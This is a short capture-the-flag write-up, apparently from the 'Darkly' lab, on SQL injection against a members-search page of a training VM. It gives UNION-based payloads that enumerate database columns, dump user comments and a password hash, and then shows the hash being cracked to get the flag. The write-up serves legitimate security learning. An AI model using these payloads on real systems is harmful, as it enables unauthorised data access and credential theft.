# SQL Injection - Members Search

See [SQL injection Images](https://github.com/anyashuka/Darkly/tree/master/SQL_Injection_Images) for SQL Injection description, use & prevention.


## Breach

Go to page:

{VM_IP}/index.php?page=member

We're going to be doing the same thing here as we did in the SQL image search injection. 
Insert the following commands into the image search bar:


### Test if vulnerable to SQL Injection

```1 OR 1=1```

... we get all the results because every row is considered true.


### Find table columns in the database for each table

```1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS```

Here we find:

* First name: users,
Surname : user_id
* First name: users,
Surname : first_name
* First name: users,
Surname : last_name
* First name: users,
Surname : town
* First name: users,
Surname : country
* First name: users,
Surname : planet
* First name: users,
Surname : Commentaire
* First name: users,
Surname : countersign


### Look at the comment below each user

```1 OR 1=1 UNION SELECT first_name, commentaire FROM users```

Here we find:

* First name: Flag,
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !


### Find the countersign

```1 OR 1=1 UNION SELECT first_name, countersign FROM users```

* First name: Flag,
Surname : 5ff9d0165b4f92b14994e5c685cdce28

[md5 decrypt](https://md5decrypt.net)(5ff9d0165b4f92b14994e5c685cdce28) = FortyTwo
[sha256 encrypt](https://md5decrypt.net/Sha256)(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

flag = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
